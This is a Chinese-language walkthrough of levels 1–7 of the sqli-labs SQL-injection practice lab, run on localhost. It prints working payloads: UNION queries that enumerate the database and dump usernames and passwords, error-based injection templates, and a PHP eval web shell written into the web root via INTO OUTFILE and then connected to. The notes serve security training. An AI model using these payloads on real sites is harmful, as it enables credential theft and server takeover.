# sqli-lab通关笔记

## 第一关

输入单引号报语法错误，说明是字符型注入，输入#注释符成功不显示报错

![image-20210510214933062](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510214933062.png)

开始`order by`查看列数 `union select` 查看显示的列数信息，然后查看`database()、version()、`如果是mysql数据库并且版本号大于5.0，就可以利用`information_schema`这个数据库进行信息的显示。而本关卡正好符合，很容易就破解了。

+ 获取列数，4列报错，3列正常显示，则说明显示SQL语句显示3列信息

  ![image-20210510215437509](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510215437509.png)

+ 获取显示的列 **注意，单引号前面的1要改成-1，因为他不能显示信息，后面的语句才能显示**

![image-20210510215708911](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510215708911.png)

显示`2,3`，下面我们就在2,3列上修改sql函数

+ 获取SQL数据库信息

  ![image-20210510215854464](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510215854464.png)

+ 先获取数据库信息、数据库表名信息、表的列名信息、最后成功显示出表中的信息

~~~mysql
?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata # //枚举数据库
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security' %23 //枚举数据库所有表名
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' %23  //枚举users表中的所有列名
?id=-1' union select 1,2,group_concat(concat(username,0x7e,password))from users %23//枚举出所有的username和password,并用~分割开

~~~

枚举所有的数据库信息![image-20210510220708753](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510220708753.png)

枚举数据库所有表名

![image-20210510220948625](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510220948625.png)

枚举users表中的所有列名

![image-20210510221142238](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510221142238.png)

枚举出所有的users表中的username和password，破解成功

![image-20210510221810545](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510221810545.png)

## 第二关

输入`'`单引号报语法错误，然后输入注释符之后报错并没有消失，根据报错信息可以推断出这个SQL查询语句应该是数字型的。

![image-20210511101332144](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511101332144.png)

于是开始针对数字型注入开始测试，成功得到信息

![image-20210511101454919](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511101454919.png)

于是开始和第一关一样的套路，详情略过

## 第三关

判断注入类型，输入 `'`单引号报错，但是显示的报错信息有一个 `)`，我们猜测代码中进行了限制，用（）把id变量包含了起来，输入）进行验证，报错成功不显示了

![image-20210511140358241](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511140358241.png)

![image-20210511140524020](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511140524020.png)

接下来就是判断列数--》3列

以下步骤和前两关一样，不在赘述

![image-20210511140815064](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511140815064.png)

## 第四关

输入 `'`单引号判断注入类型，不报错，然后我就以为是数字类型注入，直接输入order by 判断列数，结果并没有回显列数，看来也不是数字型注入。看了源码才知道原来是 `"`双引号字符型+ `)` 注入，代码写的还挺绕。。。。

于是开始老套路，先判断列数

![image-20210511141636612](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511141636612.png)

显示`database()、version()、users()`

利用information_schema数据库爆出想要的数据表信息，不再赘述

![image-20210511141936063](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511141936063.png)

## 第五关

这一关是字符型注入，和第一关一样，但是这一关并不显示数据信息，只显示You are in……

![image-20210511142142909](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511142142909.png)

我的思路是利用报错注入，利用那三种报错注入显示数据库信息。

~~~mysql
1. union select count(*) ,concat ((此处加入执行语句),0x7e,floor (rand (0)*2))  as a from information _schema.tables group by a;
2. or extractvalue(1,concat (0x7e,(此处加入执行语句),0x7e));
3. union select updatexml(1,concat (0x7e,(此处加入执行语句),0x7e),1);
~~~

接下来利用三种语句的其中之一利用information_schema库进行注入即可

![image-20210511145507931](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511145507931.png)

## 第六关

输入 `'`单引号没错误显示，可能不是单引号字符注入，试试双引号成功回显语法错误信息，看来是`id`用双引号包起来的，再在后面加个注释符看看错误信息消不消失，如果消失了，那就是双引号字符注入。果然错误信息消除，正常回显信息。

![image-20210512221642700](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210512221642700.png)

于是开始下一波的操作，查询列数，回显数据库的相关信息。很明显这一关他不回显数据库中的正确信息，如果语法正确他只显示You are in……，看来只能用报错注入语句试试了。

![image-20210512222329424](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210512222329424.png)

成功通关

## 第七关

第七关输入 `'`单引号报错了，然后输入注释符还是报错。输入双引号并不会报错说明不是双引号字符报错。在单引号后面输入）括号加上注释符还是报错，试试在单引号后面加上两个））引号+注释符，报错消失了，说明payload是 `')) #`。于是开始注入，判断列数和数据库信息，但是都不回显有用的信息，用报错注入还会提示有语法错误。

![image-20210513212407123](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210513212407123.png)

提示了 `Use outfile`

百度一下

**导出文件GET字符型注入**

> 导出到文件就是可以将查询结果导出到一个文件中，如常见的将一句话木马导出到一个php文件中，sqlmap中也有导出一句话和一个文件上传的页面
>
> 常用的语句是：  select "<?php @eval($_POST['giantbranch']);?>" into outfile "XXX\test.php" ，当这里要获取到网站的在系统中的具体路径（绝对路径）
>
> 这个要怎么获取呢，根据系统和数据库猜测，如winserver的iis默认路径是c:/inetpub/wwwroot/，这好像说偏了，这是asp的，但知道也好
>
> linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等
>
> apache 就/var/www/htm，/var/www/html/htdocs
>
> **获取路径下面给一个很有可能获取得到的方法，（因为less7不输出信息，先从less获取信息）**
>
> 首先介绍两个可以说是函数，还是变量的东西
>
> @@datadir 读取数据库路径
>  @@basedir MYSQL 获取安装路径

那对于此处注入 没有输出 没有报错 信息回显 我们可以干嘛呐？？？

可以写入文件 别问我为什么知道 他上面谢了outfile  可是我们不知道他的绝对路径 从何写入

判断是否有写权限，可以判断有写权限

`/Less-7?id=1')) and (select count(*)from mysql.user)>0 --+` //如果返回正常则有读写权限

没办法了 这里只有从第一关来获取了

![image-20210513213648272](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210513213648272.png)

现在就是要根据目录判断该项目的地址，并写一个一句话木马文件进行连接

构造payload

~~~http
http://localhost/sqli-labs/Less-7/?id=1')) union select null,null,'<?php @eval($_POST[pass])?>' into outfile "D:\\phpstudy\\phpstudy_pro\\WWW\\sqli-labs\\shell.php"
~~~

上传成功，这里注意会出现 `**mysql 报错The MySQL server is running with the --secure-file-priv option so it cannot execute**`，需要在my.ini修改secure_file_priv='into 文件的地址'

![image-20210513220146623](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210513220146623.png)

然后用蚁剑成功连接服务器

![image-20210513220212340](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210513220212340.png)

